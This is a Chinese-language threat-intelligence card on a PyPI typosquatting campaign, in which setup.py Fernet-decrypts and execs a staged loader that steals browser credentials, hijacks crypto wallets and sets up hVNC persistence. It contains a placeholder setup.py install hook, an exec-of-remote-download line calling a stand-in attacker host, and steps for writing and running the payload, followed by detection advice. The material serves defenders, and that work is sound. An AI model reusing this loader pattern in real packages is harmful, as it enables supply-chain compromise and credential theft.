---
id: cloud-cicd-pypi-fernet-encrypted-staged-loader
title: PyPI 拼写抢注投毒：setup.py 用 Fernet 硬编码密钥解密执行，分阶段拉取浏览器窃密与数字钱包劫持载荷
type: scenario
domain: cloud
path: cloud/ci-cd
technique: pypi-fernet-encrypted-staged-loader
tags:
- supply-chain
- pypi
- typosquatting
- fernet
- encrypted-loader
- infostealer
- browser-credentials
- ci-cd
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
affected_versions: PyTorchc 1.0.0（PyPI 恶意包版本）；同批 56 个仿 PyTorch/TensorFlow 名称的包，版本均为 1.0.0（原文示例：pytorchc、tensoflaw、tensorflow）
verification:
  verified_by: verifier-V451
  verified_at: '2026-11-10T01:34:49+08:00'
  notes: 已对照原文与25/25图片核对：PyTorchc setup.py 自定义安装类在 os.name==nt 时 Fernet 硬编码密钥解密 exec（图21）、第一阶段 funcaptcha.ru/paste2?package=PyTorchc 拉取、第二阶段 gruppe.py 写 %APPDATA% 并执行、gruppe.py 内再嵌 Fernet 密文解出第三阶段（图22）、浏览器凭据收集（图23）、回传 funcaptcha.ru/delivery（图24）、下载 app.asar 与 hvnc/runpython 持久化均一致；56 个仿名包版本均 1.0.0、下载3539次（图19/20）属实。dedup 候选 multiplerequests/typosquat 均 related 非同链；最终载荷行为已并入本卡未单独成卡，颗粒度按单一 Fernet 分阶段加载链成立。版本原文明确，保留。无 sources/source_url。未验证点：PoC 占位未执行；密文与远程地址未复测。
url: /docs/cloud/ci-cd/cloud-cicd-pypi-fernet-encrypted-staged-loader/
draft: false
kb_aliases:
- PyTorchc 投毒
- PyTorch/TensorFlow 拼写抢注
- Fernet 加密供应链载荷
- 分阶段远程载荷
- funcaptcha.ru paste
---

## 一句话结论

攻击者批量注册与 PyTorch、TensorFlow 等热门库高度相似的包名（拼写抢注），在 `setup.py` 中用硬编码密钥的 Fernet 密文包住第一阶段代码，安装时解密并 `exec`；第一阶段从远程 paste 地址拉取第二阶段 `gruppe.py` 写入 `%APPDATA%` 并执行，`gruppe.py` 内再嵌一段 Fernet 密文解出第三阶段——Chromium 系浏览器凭据收集与数字钱包客户端劫持。

## 原理

- **拼写抢注扩大命中面**：`pytorchc`、`pytorch`、`tensoflaw`、`tensorflow` 等名称与热门 AI 库只差少量字符，开发者手误或复制错名称就会安装。攻击者一次投放几十个同代码包，命中概率远高于单包。原文统计该批针对 PyTorch/TensorFlow 的恶意包下载约 3539 次。
- **Fernet 把关键代码变成密文**：`setup.py` 的自定义安装类在 `os.name == "nt"` 时导入 `fernet`，执行 `exec(Fernet(b'<硬编码 key>').decrypt(b'<token>'))`。Fernet 是 AES-128-CBC + HMAC 的对称认证加密，密钥直接写在包内，所以目的不是保密而是**绕过静态扫描**：包内没有明文 URL/命令，普通关键字匹配失效；运行时才解密。
- **多阶段远程加载**：第一阶段的解密结果只有一句 `exec(requests.get(<paste 地址>).text...)`，从攻击者服务器上的 paste 接口按包名取回第二阶段代码；第二段 `gruppe.py` 被写入 `%APPDATA%` 后由 `sys.executable` 运行。每阶段都很短，且真正的窃密逻辑留在服务器，便于替换与规避下架。
- **第二段里再嵌第三段**：`gruppe.py` 内还有一段独立 Fernet 密文（另一把硬编码密钥），解密后才是最终载荷。这种“包内密文 → 远程明文 → 落地文件密文”的链让每层单独看都不完整。
- **最终载荷行为**：第三阶段导入 `sqlite3`、`win32crypt`、`Cryptodome.Cipher.AES`，枚举 Chrome、Edge、Opera、Opera GX、Brave、Yandex 等 Chromium 系浏览器的 `User Data` 与 `Default`/`Profile 1` 配置，读取 Cookie/登录数据并解密，打包后 POST 到攻击者接收地址；同时下载恶意 `app.asar` 覆盖 Exodus、Atomic Wallet 的 Electron 资源目录（另见 app.asar 劫持卡）；还释放 `runpython.py` 到 `%APPDATA%\Microsoft`，由其生成批处理申请管理员权限、用 `Add-MpPreference` 添加 `.exe`/`.dll` 扩展名与 `C:` 路径的 Defender 排除项，下载 `hvnc.exe` 执行，并把 `hvnc.py` 写入启动目录实现开机自启。
- **为什么有效**：`setup.py` 安装期执行是 pip 的既定行为；Fernet 密钥内置使解密无需外部依赖；分阶段让扫描器难以看到完整链；远程 paste 可按包名返回不同内容，方便统计受害者。

## 触发条件

- 受害者在 Windows 上安装仿名包（`pip install pytorchc` 等）或依赖解析命中；
- pip 执行 `setup.py`（sdist/无 wheel），且安装环境可访问 `funcaptcha.ru` 一类远程地址；
- 安装用户权限可写 `%APPDATA%`，可拉起子进程；
- 主机存在 Chromium 系浏览器或 Exodus/Atomic Wallet，最终载荷才有数据可窃。

## 利用步骤

1. 批量注册与热门库相近的包名，版本统一填 `1.0.0`，`setup.py` 正常声明元数据；
2. 在自定义安装类中判断 Windows，导入 `fernet` 并 `exec(Fernet(key).decrypt(token))` 解密第一阶段；
3. 第一阶段请求 `funcaptcha.ru/paste2?package=<包名>` 取回第二阶段代码，写入 `%APPDATA%\gruppe.py`，用当前解释器执行；
4. `gruppe.py` 解密内置第三阶段密文，执行浏览器凭据收集、钱包 `app.asar` 替换、启动项持久化与 `hvnc.exe` 下载；
5. 采集结果打包上传攻击者接收地址，后续可远程升级 paste 内容。

## PoC

最小结构示意（密钥与密文为占位，不执行真实载荷）：

```python
# setup.py（节选）
from setuptools import setup
from setuptools.command.install import install

class Cmd(install):
    def run(self):
        import os
        if os.name == "nt":
            import requests
            from fernet import Fernet
            exec(Fernet(b"<32-byte-urlsafe-base64-key>")
                 .decrypt(b"<fernet-token>"))
        install.run(self)

setup(name="PyTorchc", version="1.0.0", cmdclass={"install": Cmd})
```

第一阶段解密后等价逻辑：

```python
exec(requests.get("hxxp://attacker.example/paste2?package=PyTorchc").text)
```

第二阶段写入并执行：

```python
import os, sys
path = os.path.join(os.getenv("APPDATA"), "gruppe.py")
open(path, "w").write(stage2_content)
os.system(sys.executable + " " + path)
```

生成密文（本地演示）：

```python
from cryptography.fernet import Fernet
key = Fernet.generate_key()
token = Fernet(key).encrypt(b'print("stage1")')
print(key, token)
```

验证：在隔离环境把远程地址指向本地服务，可观察到 `setup.py` 安装期解密、下载、写 `%APPDATA%` 与子进程执行；不要对真实主机运行。

## 变体与关联

- 变体：加密算法可换 AES/ChaCha20/XOR + Base64；远程阶段可用 paste、GitHub raw、rentry、对象存储；也可把密钥放在远程配置中实现“无密钥包”。
- 变体：安装期执行点可换 `setup.py` 顶层、`cmdclass`、PEP 517 构建后端或 `.pth`。
- 关联：Electron 钱包 `app.asar` 替换细节见 [[cloud-cicd-electron-wallet-app-asar-replace-hijack]]；`setup.py` 顶层 Base64 两阶段窃密见 [[cloud-cicd-pypi-multiplerequests-setup-py-cstealer]]；`cmdclass` 远程脚本见 [[cloud-cicd-pypi-setup-py-custom-install-command-remote-bash]]；Defender 排除项持久化见 [[pentest-persistence-defender-exclusionpath-userprofile-programfiles]]。
- 边界：只允许已审 wheel、`--only-binary`、或安装环境断网时链断；Windows 判断使该样本不在 Linux 触发。

## 检测与防御

- 检测：`setup.py` 中出现 `from fernet import Fernet`、`Fernet(b'...').decrypt(...)` 与 `exec` 组合；包内无明文网络逻辑但导入 `fernet`/`requests`。
- 检测：安装期 `setup.py` 进程发起外联并写入 `%APPDATA%` 下的 `.py` 后立刻用 `sys.executable` 启动；`funcaptcha.ru` 等 paste 域名。
- 检测：浏览器 `Login Data`/`Cookies` 被非浏览器进程读取，`%LOCALAPPDATA%` 下钱包应用 `resources/app.asar` 被改写。
- 加固：只安装已审 wheel 并校验哈希；对 `setup.py`/`pyproject.toml` 做静态审计；限制安装环境出站；对 fernet 依赖与异常 `exec` 组合告警。
- 响应：断网隔离、卸载包、删除 `%APPDATA%\gruppe.py` 与启动项、重置浏览器会话与钱包、检查钱包客户端完整性。
